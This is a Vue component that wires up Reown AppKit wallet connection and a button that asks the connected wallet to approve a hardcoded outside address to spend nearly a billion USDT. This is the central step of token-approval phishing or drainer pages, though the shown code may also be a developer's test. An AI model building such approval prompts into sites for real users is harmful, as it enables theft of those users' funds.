<script setup lang="ts">
import { createAppKit, useAppKit } from '@reown/appkit/vue'
import { EthersAdapter } from '@reown/appkit-adapter-ethers'
import { mainnet, arbitrum } from '@reown/appkit/networks'
import { useWriteContract } from '@wagmi/vue'
import { abi } from './abi'

const { writeContract } = useWriteContract()

async function approve() {
  try {
    alert('Approving...');
    await writeContract({
      abi,
      address: '0xdAC17F958D2ee523a2206206994597C13D831ec7', // USDT合约地址
      functionName: 'approve',
      args: [
        '0x5ecA4288BFe530AB9b3cf455eE94c8951EA292bb', // 被授权地址
        999999999999999n, // 授权金额
      ],
    });
    console.log('Approval successful');
  } catch (error) {
    console.error('Approval failed:', error);
    alert('Approval failed: ' + error);
  }
}

// 1. Get projectId from https://cloud.reown.com
const projectId = '4703d1a7a30b63665f8d8e8339a9aceb'

// 2. Create your application's metadata object
const metadata = {
  name: 'My Website',
  description: 'My Website description',
  url: 'https://mywebsite.com', // url must match your domain & subdomain
  icons: ['https://avatars.mywebsite.com/']
}

// 3. Create a AppKit instance
createAppKit({
  adapters: [new EthersAdapter()],
  networks: [mainnet, arbitrum],
  metadata,
  projectId,
  features: {
    analytics: true // Optional - defaults to your Cloud configuration
  }
})

// 4. Use modal composable
const modal = useAppKit()
</script>

<template>
  <w3m-button />
  <button @click="approve">
    approve
  </button>
</template>